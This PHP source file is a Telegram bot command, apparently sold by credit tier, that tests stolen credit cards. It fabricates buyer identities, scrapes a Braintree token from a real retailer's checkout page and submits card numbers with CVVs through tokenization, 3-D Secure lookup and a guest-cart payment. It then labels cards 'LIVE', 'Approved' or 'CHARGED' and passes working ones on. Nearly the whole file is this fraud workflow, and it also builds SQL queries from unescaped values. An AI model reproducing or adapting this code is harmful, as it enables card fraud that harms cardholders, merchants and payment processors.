<?php
if(strpos($message, '!au') === 0 or strpos($message, '/au') === 0 or strpos($message, '.au') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace(''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
    $result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $bincap2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $bincap3 = trim(strip_tags(getStr($result, '<td>'.$bincap2.'</td><td>','</td>')));
    $bincap4 = trim(strip_tags(getStr($result, '<td>'.$bincap3.'</td><td>','</td>')));
    $bincap5 = trim(strip_tags(getStr($result, '<td>'.$bincap4.'</td><td>','</td>')));
    $roldex = trim(strip_tags(getStr($result, '<td>'.$bincap5.'</td><td>','</td>')));
    $che = bannedbin($bin);
    if(strpos($result, 'No bins found!') or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://zwillingbeauty.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Cookie: PHPSESSID=b703d8f62b23263ccf1411626b6d368f;_sp_ses.3b03=*;OptanonAlertBoxClosed=2021-08-18T04:55:13.497Z;form_key=Q4Wtsj9s609QyRbQ;_gcl_au=1.1.1880417150.1629262520;form_key=Q4Wtsj9s609QyRbQ;mage-banners-cache-storage=%7B%7D;mage-cache-storage=%7B%7D;mage-cache-storage-section-invalidation=%7B%7D;mage-cache-sessid=true;recently_viewed_product=%7B%7D;recently_viewed_product_previous=%7B%7D;recently_compared_product=%7B%7D;recently_compared_product_previous=%7B%7D;product_data_storage=%7B%7D;ABTasty=uid=hvcz7yef03x7ysve&fst=1629262505861&pst=-1&cst=1629262505861&ns=1&pvt=5&pvis=5&th=;ABTastySession=mrasn=&lp=https%253A%252F%252Fzwillingbeauty.com%252Fcheckout%252Fcart%252F%2523payment&sen=5;__kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2MjkyNjI1MDksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vendpbGxpbmdiZWF1dHkuY29tL2NoZWNrb3V0L2NhcnQvI3BheW1lbnQifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2MjkyNjI1NTEsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vendpbGxpbmdiZWF1dHkuY29tL2NoZWNrb3V0L2NhcnQvI3BheW1lbnQifX0=;OptanonConsent=isIABGlobal=false&datestamp=Wed+Aug+18+2021+10%3A25%3A53+GMT%2B0530+(India+Standard+Time)&version=6.13.0&hosts=&consentId=baca7fc9-cef2-4a97-874d-327938c46549&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0003%3A0&geolocation=%3B&AwaitingReconsent=false;mage-messages=;_sp_id.3b03=29c8d89fb8aff078.1629262510.1.1629262583.1629262510;private_content_version=206d7d8962202182e9a3e5b141dd9461;section_data_ids=%7B%22cart%22%3A1629263567%2C%22directory-data%22%3A1629262567%2C%22ammessages%22%3A1629263567%2C%22signifyd-fingerprint%22%3A1629262567%2C%22company%22%3A1629263567%2C%22messages%22%3Anull%7D';
$headers[] = 'referer: https://zwillingbeauty.com/manikure-pedikure-set-3tlg-mit-kombi-nagelschere-leder-braun-97405-007-0.html';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$get = curl_exec($ch);
//MERCHANT ID
$merchant = trim(strip_tags(getStr($get, '"merchantId":"','"')));

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($get, '"clientToken":"','",')));

// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
echo "bearer: $bearer <br>";
echo "merchant: $merchant <br>";
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://zwillingbeauty.com';
$headers[] = 'Referer: https://zwillingbeauty.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$session.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Issac Newton"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl2 = curl_exec($ch);
$token = trim(strip_tags(getstr($curl2, '"token":"','"')));
curl_close($ch);

#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://zwillingbeauty.com';
$headers[] = 'Referer: https://zwillingbeauty.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"99.95","additionalInfo":{"shippingGivenName":"'.$first.'","shippingSurname":"'.$last.'","shippingPhone":"'.$phone.'","billingLine1":"'.$street.'","billingLine2":"","billingCity":"'.$city.'","billingState":"'.$state.'","billingPostalCode":"'.$zip.'","billingCountryCode":"US","billingPhoneNumber":"'.$phone.'","billingGivenName":"'.$first.'","billingSurname":"'.$last.'","shippingLine1":"'.$street.'","shippingLine2":"","shippingCity":"'.$city.'","shippingState":"'.$state.'","shippingPostalCode":"'.$zip.'","shippingCountryCode":"US","email":"'.$email.'"},"bin":"'.$bin.'","dfReferenceId":"0_1a30c2ca-9949-49be-be53-655f498b5e2d","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.68.0","cardinalDeviceDataCollectionTimeElapsed":867,"issuerDeviceDataCollectionTimeElapsed":1347,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.68.0","_meta":{"merchantAppId":"zwillingbeauty.com","platform":"web","sdkVersion":"3.68.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$session.'"}}');
$lookup = curl_exec($ch);
$status = trim(strip_tags(getstr($lookup, '"status":"','"')));
$enrolled = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"enrolled":"','"')))));
$nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"nonce":"','"')))));
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

#---------------------------------------------------------------[RESPONSES]-------------------------------------------------------#

// if(!strpos($lookup, "authenticate_attempt_successful") or !strpos($lookup, 'lookup_not_enrolled') or $status != 'N'){
   // $cc_code = 'VBV BIN';
   // $nonce = "Can't Go Further";
// }

#------[CURL-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://zwillingbeauty.com/rest/ge_zwilling_default/V1/guest-carts/6ZUZTNKJOLs0LRuSnwDsI0ebkpqNoAJH/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'Origin: https://zwillingbeauty.com';
$headers[] = 'Referer: https://zwillingbeauty.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"6ZUZTNKJOLs0LRuSnwDsI0ebkpqNoAJH","billingAddress":{"countryId":"DE","regionId":"90","regionCode":"SL","region":"Saarland","street":["3 allen street"],"company":"","telephone":"","postcode":"10002","city":"New York","firstname":"'.$first.'","lastname":"'.$last.'","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$nonce.'","device_data":"{\"device_session_id\":\"7f3fbde1cd27a1cceb1934d42e417ab7\",\"fraud_merchant_id\":null,\"correlation_id\":\"5af64d5f57178e2603851bc2cd432b1e\"}","amgdpr_agreement":"{\"privacy_checkbox\":true}"}},"email":"'.$email.'"}');
$result = curl_exec($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

$result2 = curl_exec($ch);
$nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($result, 'd. ','"}')))));
if(strpos($result2, 'Card Issuer Declined CVV')){
$cc_code = 'CCN LIVE ✅';
ccn($list);
}
elseif(strpos($result2, 'Insufficient Funds')){
$cc_code = 'Approved ✅';
cvv($list);
}
elseif ((strpos($result2, "Thank")) || (strpos($result2, "Success ")) || (strpos($result2, "succeeded"))){ 
$cc_code = 'Approved ✅';
if(empty($nonce) and isset($result2)){
$nonce = 'CHARGED ✅';
cvv($list);
}
}
else{
$cc_code = 'Declined ❌';
}

if(empty($result)){
sendMessage1($result);
sendMessage1($list);
$result = urlencode("<b>
GATE --> <i>BRAINTREE</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Try Again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////



$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$status = preg_replace('/_/', ' ', ucfirst($status));
$result = urlencode("<b>
GATE --> <i>BRAINTREE</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $cc_code
Message ->> $nonce
ENROLLED ->> $enrolled || STATUS ->> $status
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
rest($lista);
        $timest = time(); 

$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
$result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}
?>